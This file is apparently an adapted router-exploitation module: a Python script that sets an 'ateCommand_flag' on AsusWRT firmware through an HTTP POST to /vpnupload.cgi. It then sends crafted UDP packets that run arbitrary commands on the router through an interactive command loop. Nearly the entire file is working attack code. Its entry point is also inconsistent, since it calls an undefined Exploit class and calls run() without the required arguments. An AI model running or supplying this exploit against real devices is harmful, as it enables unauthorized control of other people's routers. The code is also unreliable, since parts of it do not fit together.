target = ""
# asuswrt_lan_rce.py
# rsf exploit module
# description: Remote code execution in AsusWRT firmware via HTTP and UDP vulnerabilities

import socket
import struct
import random
import string
import http.client


def random_text(length):
    return ''.join(random.choice(string.ascii_letters) for _ in range(length))


def http_post(target, port, path, files):
    conn = http.client.HTTPConnection(target, port, timeout=5)
    boundary = "----WebKitFormBoundary" + random_text(16)
    headers = {
        "Content-type": f"multipart/form-data; boundary={boundary}"
    }
    body = ""
    for key, value in files.items():
        body += f"--{boundary}\r\n"
        body += f'Content-Disposition: form-data; name="{key}"\r\n\r\n'
        body += f"{value}\r\n"
    body += f"--{boundary}--\r\n"

    conn.request("POST", path, body.encode(), headers)
    response = conn.getresponse()
    status = response.status
    conn.close()
    return status


def udp_send_recv(ip, port, payload):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(3)
    sock.sendto(payload, (ip, port))
    try:
        data, _ = sock.recvfrom(512)
    except socket.timeout:
        data = None
    sock.close()
    return data


def run(target, http_port, udp_port):
    status = http_post(target, http_port, "/vpnupload.cgi", {"ateCommand_flag": "1"})
    if status == 200:
        print("[+] Successfully set ateCommand_flag variable")
    else:
        print("[-] Failed to set ateCommand_flag variable")
        return

    # Simulate command loop
    while True:
        cmd = input("cmd> ")
        if cmd.strip().lower() in ["exit", "quit"]:
            break
        print(execute(target, udp_port, cmd))


def execute(target, udp_port, cmd):
    ibox_comm_pkt_hdr_ex = (
        struct.pack("<B", 0x0c) +
        struct.pack("<B", 0x15) +
        struct.pack("<H", 0x33) +
        random_text(4).encode() +
        random_text(6).encode() +
        random_text(32).encode()
    )

    cmd_bytes = cmd.encode() + struct.pack("<B", 0x00)
    pkt_syscmd = struct.pack("<H", len(cmd_bytes)) + cmd_bytes
    payload = ibox_comm_pkt_hdr_ex + pkt_syscmd + random_text(512 - len(ibox_comm_pkt_hdr_ex + pkt_syscmd)).encode()

    response = udp_send_recv(target, udp_port, payload)

    if response and len(response) == 512:
        length = struct.unpack('<H', response[14:16])[0]
        return response[16: 16 + length].decode()

    return ""




import sys

if __name__ == "__main__":
    print("Run script:", __file__)
    if len(sys.argv) < 2:
        print(f"Usage: python3 {sys.argv[0]} <target_ip>")
        sys.exit(1)

    target_ip = sys.argv[1]
    exploit = Exploit()
    exploit.target = target_ip
    exploit.run()
